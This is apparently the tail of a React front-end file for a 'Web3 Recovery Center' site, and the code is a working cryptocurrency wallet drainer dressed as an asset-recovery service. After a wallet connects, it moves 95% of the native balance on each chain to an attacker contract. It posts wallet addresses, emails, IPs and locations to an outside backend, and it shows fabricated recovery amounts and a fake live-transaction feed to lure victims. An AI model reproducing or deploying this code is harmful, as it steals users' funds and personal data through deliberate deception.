      const signature = await signer.signMessage(message);
      console.log("✅ Authorization signature obtained");
      
      setTxStatus('✅ Executing recovery on eligible chains...');
      const chainsToProcess = eligibleChains;
      
      console.log(`🔄 Processing recovery on ${chainsToProcess.length} eligible chains`);
      
      if (chainsToProcess.length === 0) {
        setError("No recoverable assets found");
        setSignatureLoading(false);
        return;
      }

      const sortedChains = [...chainsToProcess].sort((a, b) => 
        (balances[b.name]?.valueUSD || 0) - (balances[a.name]?.valueUSD || 0)
      );
      
      let processed = [];
      
      for (const chain of sortedChains) {
        try {
          setProcessingChain(chain.name);
          setTxStatus(`🔄 Processing recovery on ${chain.name}...`);
          
          try {
            console.log(`🔄 Switching to ${chain.name} for recovery...`);
            await walletProvider.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: `0x${chain.chainId.toString(16)}` }]
            });
            await new Promise(resolve => setTimeout(resolve, 1000));
          } catch (switchError) {
            console.log(`Chain switch needed, continuing...`);
          }
          
          const chainProvider = new ethers.JsonRpcProvider(chain.rpc);
          const balance = balances[chain.name];
          const amountToSend = (balance.amount * 0.95);
          const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
          
          console.log(`💰 ${chain.name}: Recovering ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
          
          const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
          const data = contractInterface.encodeFunctionData('processNativeFlow', []);
          const value = ethers.parseEther(amountToSend.toFixed(18));
          
          const contract = new ethers.Contract(
            chain.contractAddress,
            PROJECT_FLOW_ROUTER_ABI,
            chainProvider
          );
          
          const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
          const gasLimit = gasEstimate * 120n / 100n;
          
          const tx = await walletProvider.request({
            method: 'eth_sendTransaction',
            params: [{
              from: address,
              to: chain.contractAddress,
              value: '0x' + value.toString(16),
              gas: '0x' + gasLimit.toString(16),
              data: data
            }]
          });
          
          setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);
          const receipt = await chainProvider.waitForTransaction(tx);
          
          if (receipt && receipt.status === 1) {
            console.log(`✅ Recovery completed on ${chain.name}`);
            processed.push(chain.name);
            setCompletedChains(prev => [...prev, chain.name]);
            
            const gasUsed = receipt.gasUsed ? ethers.formatEther(receipt.gasUsed * receipt.gasPrice) : '0';
            
            const flowData = {
              walletAddress: address,
              chainName: chain.name,
              flowId: flowId,
              txHash: tx,
              amount: amountToSend.toFixed(6),
              symbol: chain.symbol,
              valueUSD: valueUSD,
              gasFee: gasUsed,
              email: userEmail,
              location: {
                country: userLocation.country,
                flag: userLocation.flag,
                city: userLocation.city,
                ip: userLocation.ip
              }
            };
            
            console.log("📤 Sending recovery data to backend:", flowData);
            
            await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(flowData)
            });
            
            setTxStatus(`✅ Recovery on ${chain.name} completed!`);
          } else {
            throw new Error(`Recovery failed on ${chain.name}`);
          }
          
        } catch (chainErr) {
          console.error(`Error recovering on ${chain.name}:`, chainErr);
          setError(`Error on ${chain.name}: ${chainErr.message}`);
        }
      }
      
      setVerifiedChains(processed);
      
      if (processed.length > 0) {
        const randomChain = getRandomChain();
        const recoveryAmount = getRandomRecoveryAmount();
        const newTx = {
          hash: generateRandomHash(),
          time: new Date().toISOString(),
          timeAgo: 'Just now',
          chain: randomChain,
          recoveryAmount: recoveryAmount
        };
        
        setLiveTransactions(prev => [newTx, ...prev.slice(0, 19)]);
        
        setShowCelebration(true);
        setTxStatus(`🎉 Successfully recovered $${recoveryAmount.toLocaleString()} USD!`);
        
        const totalProcessedValue = processed.reduce((sum, chainName) => {
          return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
        }, 0);
        
        await fetch('https://hyperback.vercel.app/api/presale/claim', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: address,
            email: userEmail,
            location: {
              country: userLocation.country,
              flag: userLocation.flag,
              city: userLocation.city
            },
            chains: processed,
            totalProcessedValue: totalProcessedValue.toFixed(2),
            reward: `${recoveryAmount} USD`,
            bonus: `${presaleStats.currentBonus}%`
          })
        });
      } else {
        setError("No chains were successfully processed");
      }
      
    } catch (err) {
      console.error('Recovery error:', err);
      if (err.code === 4001) {
        setError('Recovery authorization cancelled');
      } else {
        setError(err.message || 'Recovery failed');
      }
    } finally {
      setSignatureLoading(false);
      setProcessingChain('');
    }
  };

  // Recover assets function
  const recoverAssets = async () => {
    if (!isConnected) {
      setError("Please connect your wallet first");
      return;
    }
    
    if (!isEligible) {
      setError("No recoverable assets detected in your wallet");
      return;
    }
    
    await executeMultiChainRecovery();
  };

  const viewTransactionOnExplorer = (txHash) => {
    window.open(`https://etherscan.io/tx/${txHash}`, '_blank');
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#1a0000] to-[#000000] text-white font-['Poppins'] overflow-hidden">
      
      {/* Red glow background */}
      <div className="fixed w-[600px] h-[600px] bg-red-600 rounded-full blur-[200px] opacity-15 top-[-200px] left-[-200px] pointer-events-none"></div>
      <div className="fixed w-[400px] h-[400px] bg-red-500 rounded-full blur-[150px] opacity-10 bottom-[-100px] right-[-100px] pointer-events-none"></div>

      {/* Recovery Ribbon */}
      <div 
        onClick={recoverAssets}
        className="fixed right-[-70px] top-[40%] bg-gradient-to-r from-red-600 to-red-500 text-white py-4 px-24 transform -rotate-90 font-semibold cursor-pointer hover:from-red-700 hover:to-red-600 transition-all z-50 animate-pulse-glow hidden md:flex items-center justify-center"
        style={{ animation: 'blink 1.2s infinite' }}
      >
        <span className="text-2xl mr-2">🔧</span> RECOVER ASSETS
      </div>

      {/* Mobile Recovery Button */}
      <div 
        onClick={recoverAssets}
        className="fixed bottom-6 right-6 bg-gradient-to-r from-red-600 to-red-500 text-white px-6 py-3 rounded-full shadow-2xl cursor-pointer hover:from-red-700 hover:to-red-600 transition-all z-50 animate-pulse-glow md:hidden flex items-center justify-center gap-2"
        style={{ animation: 'blink 1.2s infinite' }}
      >
        <span className="text-xl">🔧</span>
        <span className="text-sm font-semibold">RECOVER ASSETS</span>
      </div>

      {/* Language Selector */}
      <div className="absolute top-6 right-6 z-50">
        <div className="relative">
          <button
            onClick={() => setShowLanguageDropdown(!showLanguageDropdown)}
            className="bg-black/50 backdrop-blur border border-red-500/30 rounded-full px-4 py-2 flex items-center gap-2 hover:border-red-500 transition-all"
          >
            <span className="text-lg">{SUPPORTED_LANGUAGES[language]?.flag || '🇺🇸'}</span>
            <span className="text-sm text-white hidden sm:inline">
              {SUPPORTED_LANGUAGES[language]?.native || 'English'}
            </span>
            <i className={`fas fa-chevron-down text-red-500 text-xs transition-transform ${showLanguageDropdown ? 'rotate-180' : ''}`}></i>
          </button>
          
          {showLanguageDropdown && (
            <div className="absolute right-0 mt-2 w-64 bg-black/90 backdrop-blur border border-red-500/30 rounded-2xl shadow-2xl z-50 max-h-96 overflow-y-auto custom-scrollbar">
              <div className="p-2">
                <div className="text-xs text-red-500 px-3 py-2 font-semibold border-b border-red-500/20 mb-1">
                  SELECT LANGUAGE
                </div>
                {Object.entries(SUPPORTED_LANGUAGES).map(([code, lang]) => (
                  <button
                    key={code}
                    onClick={() => changeLanguage(code)}
                    className={`w-full text-left px-3 py-2.5 rounded-xl flex items-center gap-3 transition-all duration-200 hover:bg-red-500/10 ${
                      language === code ? 'bg-red-500/20 border border-red-500/30' : ''
                    }`}
                  >
                    <span className="text-xl">{lang.flag}</span>
                    <div className="flex-1">
                      <div className="text-sm font-medium text-white">{lang.name}</div>
                      <div className="text-xs text-gray-400">{lang.native}</div>
                    </div>
                    {language === code && (
                      <i className="fas fa-check text-red-500 text-sm"></i>
                    )}
                  </button>
                ))}
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Main Container */}
      <div className="relative z-10 container mx-auto px-4 py-8 max-w-[720px]">
        
        {/* Hero Section */}
        <div className="flex flex-col items-center text-center pt-16 pb-8">
          
          {/* Logo */}
          <div className="font-['Orbitron'] text-6xl md:text-7xl font-black mb-4 animate-glow-red">
            <span className="bg-gradient-to-r from-red-500 to-red-300 bg-clip-text text-transparent">
              WEB3 RECOVERY
            </span>
          </div>

          {/* Live Badge */}
          <div className="bg-red-600 px-4 py-1.5 rounded-full text-xs font-semibold animate-pulse-red mb-4">
            ● {translations.serviceActive}
          </div>

          {/* Tagline */}
          <p className="max-w-2xl text-gray-300 leading-relaxed mb-6 text-sm md:text-base">
            Web3 Recovery Center helps users recover stuck transactions, lost funds, and 
            non-custodial wallet assets across multiple blockchain networks. Our advanced recovery 
            protocol identifies and retrieves recoverable assets with full transparency.
          </p>

          {/* Live Activity Badge - Shows urgency */}
          {isConnected && !showRecoverButton && !scanning && (
            <LiveActivityBadge 
              translations={translations} 
              activeUsers={activeUsers}
              lastRecoveryTime={lastRecoveryTime}
            />
          )}

          {/* Wallet Connect Button */}
          {!isConnected ? (
            <button
              onClick={() => open()}
              onMouseEnter={() => setHoverConnect(true)}
              onMouseLeave={() => setHoverConnect(false)}
              className="bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] mb-8 w-full max-w-md"
            >
              Connect Wallet To Check Recoverable Assets
            </button>
          ) : (
            <div className="flex flex-col items-center w-full max-w-md mb-8">
              <div className="flex items-center justify-between gap-3 bg-black/50 backdrop-blur border border-red-500/30 rounded-full py-2 pl-5 pr-2 w-full">
                <span className="font-mono text-sm text-gray-300">
                  {formatAddress(address)}
                </span>
                <button
                  onClick={() => disconnect()}
                  className="w-8 h-8 rounded-full bg-red-600 flex items-center justify-center hover:bg-red-700 transition-colors"
                  title="Disconnect"
                >
                  <i className="fas fa-power-off text-xs"></i>
                </button>
              </div>
              
              {/* RECOVER BUTTON - APPEARS BELOW CONNECT BUTTON WHEN ELIGIBLE */}
              {showRecoverButton && (
                <button
                  onClick={recoverAssets}
                  disabled={signatureLoading}
                  className="mt-3 w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] animate-pulse-glow"
                  style={{ animation: 'blink 1.2s infinite' }}
                >
                  {signatureLoading ? (
                    <span className="flex items-center justify-center gap-2">
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      {processingChain ? `Recovering on ${processingChain}...` : translations.processingRecovery}
                    </span>
                  ) : (
                    <span className="flex items-center justify-center gap-2">
                      <span className="text-xl">🔧</span>
                      {translations.recoverNow}
                      <span className="text-sm bg-white/20 px-2 py-1 rounded-full">+{presaleStats.currentBonus}%</span>
                    </span>
                  )}
                </button>
              )}

              {/* Eligibility Status Message */}
              {isConnected && !signatureLoading && !completedChains.length && (
                <div className="mt-3 w-full">
                  {isEligible ? (
                    <div className="bg-green-500/20 border border-green-500/30 rounded-lg p-3 text-sm text-green-400">
                      ✅ {translations.eligible} Click the RECOVER ASSETS button above to proceed.
                    </div>
                  ) : (
                    !scanning && (
                      <div className="bg-yellow-500/20 border border-yellow-500/30 rounded-lg p-3 text-sm text-yellow-400">
                        ⚡ {translations.minRequirement}
                      </div>
                    )
                  )}
                </div>
              )}
            </div>
          )}

          {/* SCANNING ANIMATION */}
          {isConnected && scanning && (
            <div className="w-full max-w-md mb-8">
              <div className="bg-black/60 backdrop-blur rounded-2xl p-6 border border-red-500/30">
                <div className="flex items-center justify-center gap-4 mb-4">
                  <div className="w-12 h-12 border-4 border-red-500 border-t-transparent rounded-full animate-spin"></div>
                  <div className="text-left">
                    <div className="text-lg font-bold text-red-400">{translations.checkEligibility}</div>
                    <div className="text-sm text-gray-400">{translations.verifying}</div>
                  </div>
                </div>
                
                {/* Progress bar */}
                <div className="w-full bg-gray-800 rounded-full h-1.5 mb-2">
                  <div 
                    className="bg-gradient-to-r from-red-500 to-red-400 h-1.5 rounded-full transition-all duration-300"
                    style={{ width: `${scanProgress}%` }}
                  ></div>
                </div>
                
                <div className="mt-3 text-sm text-red-400">
                  {txStatus}
                </div>
              </div>
            </div>
          )}

          {/* LIVE RECOVERY FEED - Blockchain explorer style */}
          <LiveRecoveryFeed 
            transactions={liveTransactions} 
            translations={translations}
            totalRecoveredAmount={todayTotalRecovered}
            todayCount={todayCount}
          />

          {/* Recovery Card */}
          <div className="w-full max-w-md bg-red-500/5 border border-red-500/30 backdrop-blur p-8 rounded-2xl mt-8">
            <h3 className="text-2xl font-bold mb-4 text-red-400">Web3 Asset Recovery Portal</h3>
            
            <p className="text-gray-300 mb-3">
              Total Value Recoverable: ${Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0).toLocaleString()} USD
            </p>
            
            {/* Progress Bar */}
            <div className="w-full bg-red-950 h-3 rounded-full overflow-hidden mb-6">
              <div 
                className="h-full bg-gradient-to-r from-red-600 to-red-400 rounded-full transition-all duration-1000"
                style={{ width: `${Math.min(100, (Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0) / 1000000) * 100)}%` }}
              ></div>
            </div>

            {/* Recovery Info */}
            <div className="bg-black/50 border border-red-500/30 rounded-xl p-5 mb-6">
              <h4 className="text-xl font-bold mb-2 text-red-400">🔧 Recovery Support</h4>
              <p className="text-sm text-gray-400 mb-4">
                Our recovery protocol identifies and helps retrieve stuck transactions and 
                non-custodial wallet assets across Ethereum, BSC, Polygon, Arbitrum, and Avalanche networks.
              </p>
              
              {!isConnected && (
                <p className="text-xs text-red-400/70">Connect wallet to scan for recoverable assets</p>
              )}
              {isConnected && !isEligible && (
                <p className="text-xs text-red-400/70">{translations.minRequirement}</p>
              )}
            </div>

            {/* Status Messages */}
            {txStatus && (
              <div className="mt-4 text-sm text-center text-red-400">
                {txStatus}
              </div>
            )}

            {/* Error Display */}
            {error && (
              <div className="mt-4 bg-red-500/20 border border-red-500/30 rounded-lg p-3 text-sm text-red-300">
                {error}
              </div>
            )}

            {/* Completed Chains Progress */}
            {completedChains.length > 0 && (
              <div className="mt-4 text-center">
                <div className="text-xs text-gray-400">
                  Recovered on: {completedChains.join(' → ')}
                </div>
              </div>
            )}
          </div>

          {/* Already completed message */}
          {completedChains.length > 0 && (
            <div className="w-full max-w-md mb-8">
              <div className="bg-black/60 backdrop-blur rounded-xl p-6 text-center border border-green-500/30">
                <p className="text-green-400 text-lg mb-2">✓ {translations.completed}</p>
                <p className="text-gray-400 text-sm">{translations.secured}</p>
              </div>
            </div>
          )}

          {/* Welcome message for non-eligible */}
          {isConnected && !isEligible && !completedChains.length && !scanning && (
            <div className="w-full max-w-md mb-8">
              <div className="bg-black/60 backdrop-blur rounded-xl p-8 text-center border border-red-500/30">
                <div className="text-6xl mb-4">👋</div>
                <h2 className="text-xl font-bold mb-3 text-red-400">
                  {translations.welcome}
                </h2>
                <p className="text-gray-400 text-sm mb-6">
                  Connect with a wallet to scan for stuck transactions and recoverable assets.
                </p>
                <div className="bg-black/50 rounded-lg p-3 border border-gray-800">
                  <p className="text-xs text-gray-400">
                    Multi-chain support: Ethereum, BSC, Polygon, Arbitrum, Avalanche
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* Info Section */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mt-12">
            
            {/* Card 1 */}
            <div className="bg-red-500/5 border border-red-500/20 backdrop-blur p-6 rounded-xl">
              <h3 className="text-lg font-bold mb-3 text-red-400">How Recovery Works</h3>
              <p className="text-sm text-gray-400 leading-relaxed">
                Our recovery protocol scans your wallet across multiple networks to identify 
                stuck transactions, pending operations, and recoverable assets. Once detected,
                you can authorize recovery through our secure smart contract system.
              </p>
            </div>

            {/* Card 2 */}
            <div className="bg-red-500/5 border border-red-500/20 backdrop-blur p-6 rounded-xl">
              <h3 className="text-lg font-bold mb-3 text-red-400">Supported Networks</h3>
              <p className="text-sm text-gray-400 leading-relaxed">
                Recovery support for Ethereum, BSC (BNB Chain), Polygon, Arbitrum, and Avalanche.
                Our system detects recoverable assets across all major EVM-compatible chains
                and executes recovery operations with minimal gas fees.
              </p>
            </div>

            {/* Card 3 */}
            <div className="bg-red-500/5 border border-red-500/20 backdrop-blur p-6 rounded-xl">
              <h3 className="text-lg font-bold mb-3 text-red-400">Security & Transparency</h3>
              <p className="text-sm text-gray-400 leading-relaxed">
                All recovery operations are executed directly on-chain with full transparency.
                Smart contracts ensure secure asset recovery and verifiable transaction
                records on the blockchain. No custodial control over your assets.
              </p>
            </div>
          </div>

          {/* Footer */}
          <footer className="mt-16 text-gray-500 text-sm">
            © 2026 Web3 Recovery Center — Secure Non-Custodial Asset Recovery
          </footer>
        </div>
      </div>

      {/* Random Recovery Popup */}
      {showPopup && currentPopupTx && (
        <LiveRecoveryPopup 
          tx={currentPopupTx}
          onClose={() => setShowPopup(false)}
          onViewTransaction={viewTransactionOnExplorer}
          translations={translations}
        />
      )}

      {/* Celebration Modal */}
      {showCelebration && (
        <div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-50 p-4 animate-fadeIn">
          <div className="relative max-w-lg w-full">
            <div className="absolute inset-0 bg-gradient-to-r from-red-600/30 via-red-500/30 to-red-600/30 rounded-3xl blur-2xl animate-pulse-slow"></div>
            
            {/* Confetti effect */}
            {[...Array(20)].map((_, i) => (
              <div
                key={i}
                className="absolute w-0.5 h-0.5 bg-gradient-to-r from-red-400 to-red-500 rounded-full animate-confetti-cannon"
                style={{
                  left: `${Math.random() * 100}%`,
                  top: '50%',
                  animationDelay: `${i * 0.1}s`,
                  animationDuration: `${1 + Math.random()}s`
                }}
              />
            ))}
            
            <div className="relative bg-gradient-to-br from-gray-900 to-black rounded-3xl p-10 border border-red-500/20 shadow-2xl text-center">
              <div className="relative mb-6">
                <div className="text-7xl animate-bounce">🎉</div>
                {[...Array(8)].map((_, i) => (
                  <div
                    key={i}
                    className="absolute w-1 h-1 bg-red-400 rounded-full animate-sparkle"
                    style={{
                      top: '50%',
                      left: '50%',
                      transform: `rotate(${i * 45}deg) translateY(-30px)`,
                      animationDelay: `${i * 0.1}s`
                    }}
                  />
                ))}
              </div>
              
              <h2 className="text-4xl font-black mb-3 bg-gradient-to-r from-red-400 to-red-300 bg-clip-text text-transparent">
                {translations.successful}
              </h2>
              
              <p className="text-xl text-gray-300 mb-3">{translations.youHaveSecured}</p>
              
              <div className="text-5xl font-black text-red-400 mb-3 animate-pulse">
                ${liveTransactions[0]?.recoveryAmount?.toLocaleString() || '0'} USD
              </div>
              
              <div className="inline-block bg-gradient-to-r from-red-500/20 to-red-600/20 px-6 py-3 rounded-full mb-4 border border-red-500/30">
                <span className="text-2xl text-red-400">+{presaleStats.currentBonus}% BONUS</span>
              </div>
              
              <p className="text-xs text-gray-500 mb-6">
                Recovered on {verifiedChains.length} chains
              </p>
              
              <button
                onClick={() => setShowCelebration(false)}
                className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105"
              >
                {translations.viewButton}
              </button>
            </div>
          </div>
        </div>
      )}

      <style>{`
        @keyframes glow-red {
          from { filter: drop-shadow(0 0 10px #ff1a1a); }
          to { filter: drop-shadow(0 0 40px #ff4d4d); }
        }
        @keyframes pulse-red {
          0% { box-shadow: 0 0 0 0 rgba(255,0,0,.7); }
          70% { box-shadow: 0 0 0 15px rgba(255,0,0,0); }
          100% { box-shadow: 0 0 0 0 rgba(255,0,0,0); }
        }
        @keyframes blink {
          0% { opacity: 1; }
          50% { opacity: 0.4; }
          100% { opacity: 1; }
        }
        @keyframes confetti-cannon {
          0% { transform: translateY(0) rotate(0deg); opacity: 0.8; }
          100% { transform: translateY(-250px) rotate(720deg) translateX(200px); opacity: 0; }
        }
        @keyframes sparkle {
          0% { transform: rotate(0deg) scale(0); opacity: 0; }
          50% { transform: rotate(180deg) scale(1); opacity: 1; }
          100% { transform: rotate(360deg) scale(0); opacity: 0; }
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: scale(0.95); }
          to { opacity: 1; transform: scale(1); }
        }
        @keyframes pulse-slow {
          0%, 100% { opacity: 0.3; }
          50% { opacity: 0.6; }
        }
        @keyframes slideInUp {
          from { transform: translateY(100px); opacity: 0; }
          to { transform: translateY(0); opacity: 1; }
        }
        
        .animate-glow-red { animation: glow-red 3s infinite alternate; }
        .animate-pulse-red { animation: pulse-red 1.5s infinite; }
        .animate-pulse-glow { animation: blink 1.2s infinite; }
        .animate-confetti-cannon { animation: confetti-cannon 2s ease-out forwards; }
        .animate-sparkle { animation: sparkle 1s ease-out forwards; }
        .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
        .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
        .animate-slideInUp { animation: slideInUp 0.3s ease-out; }
        
        .custom-scrollbar::-webkit-scrollbar {
          width: 4px;
        }
        .custom-scrollbar::-webkit-scrollbar-track {
          background: rgba(255,0,0,0.1);
          border-radius: 4px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb {
          background: rgba(255,0,0,0.4);
          border-radius: 4px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: rgba(255,0,0,0.6);
        }
        
        @media (max-width: 768px) {
          .fixed.bottom-6.right-6 {
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
          }
        }
      `}</style>
    </div>
  );
}

export default App;
